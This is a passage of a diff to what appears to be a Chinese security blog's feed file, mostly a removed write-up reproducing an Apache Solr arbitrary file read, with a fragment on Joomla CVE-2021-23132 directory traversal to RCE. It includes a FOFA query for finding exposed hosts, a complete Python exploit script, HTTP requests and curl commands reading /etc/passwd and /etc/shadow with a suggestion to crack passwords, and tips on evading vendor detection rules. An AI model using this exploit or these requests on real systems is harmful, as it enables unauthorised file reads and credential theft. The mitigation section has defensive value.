 <h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>在创建好系统后，进入后台管理，登录超级管理员用户，创建一个普通管理员用户（创建时勾选Administrator）。后面复现在该用户权限下实现目录遍历与RCE。<br><img src="/images/Joomla!CVE-2021-23132%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/4.png" alt="图片"><br><img src="/images/Joomla!CVE-2021-23132%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/5.png" alt="图片"><br><img src="/images/Joomla!CVE-2021-23132%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/6.png" alt="图片"><br><img src="/images/Joomla!CVE-2021-23132%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/7.png" alt="图片"><br>首先以新创建的普通管理员身份登录系统。切换到“多媒体文件管理”。<br><img src="/images/Joomla!CVE-2021-23132%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/8.png" alt="图片"><br><img src="/images/Joomla!CVE-2021-23132%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/9.png" alt="图片"><br><img src="/images/Joomla!CVE-2021-23132%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/10.png" alt="图片"><br>保存后，回到“多媒体文件管理”，可以看到这里可以操作整个web目录下的文件夹及文件。实现了目录遍历。<br><img src="/images/Joomla!CVE-2021-23132%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/11.png" alt="图片"><br>然后进入到administrator/components/com_users目录下，删掉config.xml文件，并重新上传一个新的config.xml文件，其内容如下。</p>
 <pre class="line-numbers language-none"><code class="language-none">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;
@@ -481,173 +684,6 @@ app&#x3D;&quot;Joomla&quot; &amp;&amp; country&#x3D;&quot;CN&quot;<span aria-hid
       </tags>
   </entry>
   <entry>
-    <title>Apache Solr任意文件读取漏洞复现</title>
-    <url>/2021/05/05/ApacheSolr%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
-    <content><![CDATA[<h3 id="FOFA"><a href="#FOFA" class="headerlink" title="FOFA"></a>FOFA</h3><pre class="line-numbers language-none"><code class="language-none">app&#x3D;&quot;Solr&quot; || app&#x3D;&quot;&quot;Apache-Solr&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<h3 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>Apache Solr 全版本存在任意文件读取漏洞，攻击者可以在未授权的情况下获取目标系统的敏感文件。</p>
-<p>我综合了网上的两种漏洞利用，写了一篇比较详尽的文章。</p>
-<h3 id="漏洞影响版本"><a href="#漏洞影响版本" class="headerlink" title="漏洞影响版本"></a>漏洞影响版本</h3><p>Apache Solr 全版本</p>
-<h3 id="漏洞POC"><a href="#漏洞POC" class="headerlink" title="漏洞POC"></a>漏洞POC</h3><p>感谢PeiQi师傅，yyds！</p>
-<pre class="line-numbers language-none"><code class="language-none"># coding&#x3D;utf-8
-# Apache Solr 全版本任意文件读取
-# Fofa：app&#x3D;&quot;Apache-Solr&quot; || app&#x3D;&quot;Solr&quot;
-
-import requests
-import json
-import sys
-import time
-
-def title():
-    print(&quot;+～～～～～～～～～～～～～～～～～～～～～～～～～～～～～+&quot;)
-    print(&quot;+～～～～～～ Apache Solr 全版本任意文件读取 ～～～～～～+&quot;)
-    print(&quot;+～～～～～～     Use: python3 solr.py     ～～～～～～+&quot;)
-    print(&quot;+～～～～～～   url: http:&#x2F;&#x2F;x.x.x.x:port   ～～～～～～+&quot;)
-    print(&quot;+～～～～～～～～～～～～～～～～～～～～～～～～～～～～～+&quot;)
-    time.sleep(2)
-
-def get_name(url):
-    url_1 &#x3D; url + &quot;&#x2F;solr&#x2F;admin&#x2F;cores?indexInfo&#x3D;false&amp;wt&#x3D;json&quot;
-    try:
-        res &#x3D; requests.get(url&#x3D;url_1)
-        #将json数据python字典话
-        name &#x3D; str(list(json.loads(res.text)[&quot;status&quot;])[0])
-        print(&quot;[!]  获取到目标系统name:\033[31m%s\033[0m&quot;%name+&quot;  [0]&quot;+&quot;URL:&quot;+url+&quot;&#x2F;solr&#x2F;&quot;+name+&quot;&#x2F;config&quot;)
-        return name
-    except Exception as e:
-        print(&quot;[!]  目标URL无法进行利用。&quot;,e)
-        sys.exit(0)
-
-def check_vul(url,name):
-    url_2 &#x3D; url +&quot;&#x2F;solr&#x2F;&quot; + name + &quot;&#x2F;config&quot;
-    data &#x3D; &#39;&#123;&quot;set-property&quot; : &#123;&quot;requestDispatcher.requestParsers.enableRemoteStreaming&quot;:true&#125;&#125;&#39;
-
-    try:
-        res &#x3D; requests.post(url&#x3D;url_2,data&#x3D;data)
-        if &quot;This response format&quot; in res.text and res.status_code &#x3D;&#x3D; 200:
-            print(&quot;[!]  \033[31m目标系统存在漏洞\033[0m&quot;)
-        else:
-            print(&quot;[!]  目标系统不存在漏洞&quot;)
-            sys.exit(0)
-    except Exception as e:
-        print(&quot;[!]  目标系统请求失败。&quot;)
-        sys.exit(0)
-
-def read_files(url,name,file_name):
-    url &#x3D; url + &quot;&#x2F;solr&#x2F;&quot; + name + &quot;&#x2F;debug&#x2F;dump?param&#x3D;ContentStreams&quot;
-    # 此处必须要加content-type,否则读取不到文件
-    headers &#x3D; &#123;
-        &quot;Content-Type&quot; : &quot;application&#x2F;x-www-form-urlencoded&quot;
-    &#125;
-    data &#x3D; &quot;stream.url&#x3D;file:&#x2F;&#x2F;&#123;&#125;&quot;.format(file_name)
-
-    try:
-        res &#x3D; requests.post(url&#x3D;url,headers&#x3D;headers,data&#x3D;data)
-        if &quot;No such file or directory&quot; in res.text:
-            print(&quot;[!] 目标系统读取文件失败！&quot;)
-            sys.exit(0)
-        else:
-            print(&quot;正在读取文件..........&quot;)
-            content &#x3D; (json.loads(res.text)[&quot;streams&quot;][0][&quot;stream&quot;])
-            print(&quot;[o] 读取文件内容为：\n\033[34m&#123;&#125;\033\0m&quot;.format(content))
-    except Exception as e:
-        print(&quot;[!]  目标系统似乎意外中断了&quot;,e)
-        sys.exit(0)
-
-if __name__ &#x3D;&#x3D; &quot;__main__&quot;:
-    title()
-    url &#x3D; str(input(&quot;\n[!]  请输入目标系统URL: &quot;))
-    name &#x3D; get_name(url)
-    check_vul(url,name)
-    file_name &#x3D; str(input(&quot;[!]  请输入要读取的文件：&quot;))
-    read_files(url,name,file_name)
-
-
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>复现环境使用了Apache Solr 8.8.1版本，搭建在kali2021虚拟机上<br><a href="https://archive.apache.org/dist/lucene/solr/8.8.1/">https://archive.apache.org/dist/lucene/solr/8.8.1/</a><br><a href="https://solr.apache.org/downloads.html">https://solr.apache.org/downloads.html</a><br><img src="/images/ApacheSolr%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/1.png" alt="图片"><br>解压后，进入bin目录执行启动命令</p>
-<pre class="line-numbers language-none"><code class="language-none">.&#x2F;solr strat<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="/images/ApacheSolr%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/2.png" alt="图片"><br>访问url,出现如下页面即为启动成功<br><img src="/images/ApacheSolr%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/14.png" alt="图片"><br>此时启动的solr是没有核心进行索引和搜索的，这里需要创建一个数据驱动模式的核心</p>
-<pre class="line-numbers language-none"><code class="language-none">.&#x2F;solr create -c [name]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="/images/ApacheSolr%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/3.png" alt="图片"></p>
-<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><h4 id="Exploit①"><a href="#Exploit①" class="headerlink" title="Exploit①"></a>Exploit①</h4><p>访问url</p>
-<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;192.168.xxx.xxx:8983&#x2F;solr&#x2F;admin&#x2F;cores?indexInfo&#x3D;false&amp;wt&#x3D;json<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="/images/ApacheSolr%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/4.png" alt="图片"><br>burp数据包为</p>
-<pre class="line-numbers language-none"><code class="language-none">GET &#x2F;solr&#x2F;admin&#x2F;cores?indexInfo&#x3D;false&amp;wt&#x3D;json HTTP&#x2F;1.1
-Host: 192.168.xxx.xxx:8983
-User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:88.0) Gecko&#x2F;20100101 Firefox&#x2F;88.0
-Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,*&#x2F;*;q&#x3D;0.8
-Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2
-Accept-Encoding: gzip, deflate
-Connection: close
-Upgrade-Insecure-Requests: 1
-Cache-Control: max-age&#x3D;0
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p><img src="/images/ApacheSolr%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/5.png" alt="图片"><br>再使用burp进行POST请求</p>
-<pre class="line-numbers language-none"><code class="language-none">POST &#x2F;solr&#x2F;test&#x2F;config HTTP&#x2F;1.1
-Host: 192.168.xxx.xxx:8983
-Cache-Control: max-age&#x3D;0
-Upgrade-Insecure-Requests: 1
-User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;88.0.4324.150 Safari&#x2F;537.36
-Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9
-Accept-Encoding: gzip, deflate
-Accept-Language: zh-CN,zh;q&#x3D;0.9
-Connection: close
-Content-Length: 82
-
-&#123;&quot;set-property&quot; : &#123;&quot;requestDispatcher.requestParsers.enableRemoteStreaming&quot;:true&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p><img src="/images/ApacheSolr%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/6.png" alt="图片"><br>当出现”This response format is experimental.  It is likely to change in the future.” 表示存在漏洞。</p>
-<p>进行文件读取</p>
-<pre class="line-numbers language-none"><code class="language-none">POST &#x2F;solr&#x2F;test&#x2F;debug&#x2F;dump?param&#x3D;ContentStreams HTTP&#x2F;1.1
-Host: 192.168.xxx.xxx:8983
-Cache-Control: max-age&#x3D;0
-Upgrade-Insecure-Requests: 1
-User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;88.0.4324.150 Safari&#x2F;537.36
-Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9
-Accept-Encoding: gzip, deflate
-Accept-Language: zh-CN,zh;q&#x3D;0.9
-Connection: close
-Content-Length: 35
-Content-Type: application&#x2F;x-www-form-urlencoded
-
-stream.url&#x3D;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p><img src="/images/ApacheSolr%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/7.png" alt="图片"><br>也可以读取shadow文件然后进行john爆破出密码</p>
-<pre class="line-numbers language-none"><code class="language-none">POST &#x2F;solr&#x2F;test&#x2F;debug&#x2F;dump?param&#x3D;ContentStreams HTTP&#x2F;1.1
-Host: 192.168.xxx.xxx:8983
-Cache-Control: max-age&#x3D;0
-Upgrade-Insecure-Requests: 1
-User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;88.0.4324.150 Safari&#x2F;537.36
-Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9
-Accept-Encoding: gzip, deflate
-Accept-Language: zh-CN,zh;q&#x3D;0.9
-Connection: close
-Content-Length: 35
-Content-Type: application&#x2F;x-www-form-urlencoded
-
-stream.url&#x3D;file:&#x2F;&#x2F;&#x2F;etc&#x2F;shadow<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p><img src="/images/ApacheSolr%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/8.png" alt="图片"></p>
-<h4 id="Exploit②"><a href="#Exploit②" class="headerlink" title="Exploit②"></a>Exploit②</h4><pre class="line-numbers language-none"><code class="language-none">curl -d &#39;&#123;  &quot;set-property&quot; : &#123;&quot;requestDispatcher.requestParsers.enableRemoteStreaming&quot;:true&#125;&#125;&#39; http:&#x2F;&#x2F;192.168.xxx.xxx:8983&#x2F;solr&#x2F;test&#x2F;config -H &#39;Content-type:application&#x2F;json&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="/images/ApacheSolr%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/11.png" alt="图片"></p>
-<pre class="line-numbers language-none"><code class="language-none">curl &quot;http:&#x2F;&#x2F;192.168.xxx.xxx:8983&#x2F;solr&#x2F;test&#x2F;debug&#x2F;dump?param&#x3D;ContentStreams&quot; -F &quot;stream.url&#x3D;file:&#x2F;&#x2F;&#x2F;&#x2F;root&#x2F;a.txt&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p>可以读取被攻击的主机文件<br><img src="/images/ApacheSolr%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/12.png" alt="图片"><br><img src="/images/ApacheSolr%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/13.png" alt="图片"></p>
-<h4 id="Exploit-POC"><a href="#Exploit-POC" class="headerlink" title="Exploit_POC"></a>Exploit_POC</h4><p><a href="https://github.com/Henry4E36/Solr">https://github.com/Henry4E36/Solr</a><br><img src="/images/ApacheSolr%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/10.png" alt="图片"><br><img src="/images/ApacheSolr%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/9.png" alt="图片"><br><img src="/images/ApacheSolr%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/15.png" alt="图片"></p>
-<h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>由于目前官方不予修复该漏洞，暂无安全版本。</p>
-<ol>
-<li>开启身份验证/授权</li>
-<li>配置防火墙策略，确保Solr API（包括Admin UI）只有受信任的IP和用户才能访问</li>
-<li>禁止将Apache Solr放置在外网</li>
-</ol>
-<h3 id="厂商防护及绕过思路"><a href="#厂商防护及绕过思路" class="headerlink" title="厂商防护及绕过思路"></a>厂商防护及绕过思路</h3><p>这种组件直接放内网就好了，或者一定配置身份校验，且Solr路由写的比较死，厂商提取规则时只要将url过滤完整即可，不会存在绕过情况。</p>
-<p>绕过的话，虽然说每个漏洞url较为固定，但是每个功能的触发点皆为每个core或collection，core的名称包含在url中，且生产环境中为用户自定义，很多规则编写者通常只将示例example加入检测，可绕过几率很高。</p>
-<h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a href="https://mp.weixin.qq.com/s/HMtAz6_unM1PrjfAzfwCUQ">https://mp.weixin.qq.com/s/HMtAz6_unM1PrjfAzfwCUQ</a><br><a href="https://mp.weixin.qq.com/s/iX2OasjynZ0MAvNTvIcmjg">https://mp.weixin.qq.com/s/iX2OasjynZ0MAvNTvIcmjg</a><br><a href="https://mp.weixin.qq.com/s/O2-rkmfkuXNr-xSLwfeQlw">https://mp.weixin.qq.com/s/O2-rkmfkuXNr-xSLwfeQlw</a></p>
-]]></content>
-      <categories>
-        <category>Web安全</category>
-        <category>漏洞复现</category>
-      </categories>
-      <tags>
-        <tag>2021.1</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>【CVE-2021-3493】Linux kernel权限提升漏洞复现</title>
     <url>/2021/04/25/Linuxkernel%E7%89%B9%E6%9D%83%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9ECVE-2021-3493%E5%A4%8D%E7%8E%B0/</url>
     <content><![CDATA[<h3 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>linux kernel一般指Linux内核。Linux是一种开源电脑操作系统内核。它是一个用C语言写成，符合POSIX标准的类Unix操作系统。<br>linux内核中的overlayfs文件系统中没有正确地验证用户名称空间和底层文件系统中文件功能的设置。由于非特权用户名称空间和Ubuntu内核中允许非特权覆盖的补丁的组合，攻击者可以使用它来获得更高的特权。</p>
@@ -897,7 +933,7 @@ set LHOST 192.168.141.133<span aria-hidden="true" class="line-numbers-rows"><spa
       </tags>
   </entry>
   <entry>
-    <title>致远OA-ajax.do任意文件上传漏洞复现</title>
+    <title>【致远OA】ajax.do任意文件上传漏洞复现</title>
     <url>/2021/01/22/%E8%87%B4%E8%BF%9COA-ajax.do%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
     <content><![CDATA[<h3 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>致远OA是一套办公协同管理软件。近日，奇安信CERT监测到致远OA的相关漏洞信息。由于致远OA旧版本某些接口存在未授权访问，以及部分函数存在过滤不足，攻击者通过构造恶意请求，可在无需登录的情况下上传恶意脚本文件，从而控制服务器。致远OA官方已针对该漏洞提供补丁。鉴于漏洞危害较大，建议用户尽快应用补丁更新。</p>
 <h3 id="漏洞影响版本"><a href="#漏洞影响版本" class="headerlink" title="漏洞影响版本"></a>漏洞影响版本</h3><p>致远OA V8.0<br>致远OA V7.1、V7.1SP1<br>致远OA V7.0、V7.0SP1、V7.0SP2、V7.0SP3<br>致远OA V6.0、V6.1SP1、V6.1SP2<br>致远OA V5.x<br>致远OA G6</p>
